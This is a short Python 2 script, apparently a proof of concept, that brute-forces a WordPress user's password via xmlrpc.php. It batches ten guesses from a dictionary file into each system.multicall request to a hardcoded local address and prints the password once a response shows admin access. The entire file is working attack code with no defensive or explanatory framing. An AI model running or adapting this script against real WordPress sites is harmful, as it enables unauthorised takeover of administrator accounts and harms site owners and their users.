import requests,sys,re,time
from xml.sax.saxutils import escape

username = sys.argv[1]

class col:
  green = '\033[92m'
  red = '\033[91m'
  e = '\033[0m'

def bfampxml(start):
  res = {'pw':{}, 'xml':''}

  xmlhead = '''
  <?xml version="1.0"?>
  <methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
  '''

  xmlbody = ''
  c = 0
  n = 0
  with open('my.dic') as f:
    for line in f:
      if n < start:
        n = (n+1)
        continue

      c = (c+1)
      if line.strip() != '' and c <= 10:
        sys.stdout.write('import password from dict ]'+str(c)+'] \r')
        xmlbody += '''
        <value><struct>
        <member>
        <name>methodName</name>
        <value><string>wp.getUsersBlogs</string></value>
        </member>
        <member>
        <name>params</name>
        <value><array><data><value><array><data>
        <value><string>''' + username + '''</string></value>
        <value><string>''' + escape(line.strip()) + '''</string></value>
        </data></array></value></data></array></value></member>
        </struct></value>
        '''
        res['pw'][c] = line.strip()
        time.sleep(0.0005)

  xmlend = '''
  </data></array></value>
  </param>
  </params>
  </methodCall>
  '''

  sys.stdout.write('\n')
  res['xml'] = xmlhead + xmlbody + xmlend

  return res

for i in range(0,12):
  print 'HTTP Request '+str(i)+':'
  x = bfampxml(i*10)
  print x['xml']
  r = requests.post('http://192.168.1.4/xmlrpc.php', headers={'Content-Type' : 'text/xml; charset=UTF-8'}, data = x['xml'])
  print ' res status ' + str(r.status_code)
  l = r.text.splitlines()
  count = 1

  print ' res body: '
  for line in l:
    if re.search('faultString.*Incorrect', line):
      count = (count + 1)
    else:
      if re.search('isAdmin.*boolean.*', line):
        print 'found ' + col.green + sys.argv[1] + col.e + ' / pass: ' + col.green + x['pw'][count] + col.e + ' -- '
        print 'done \n'
        sys.exit()
  print ' no ' + col.red + 'valid username pass found ' + col.e 
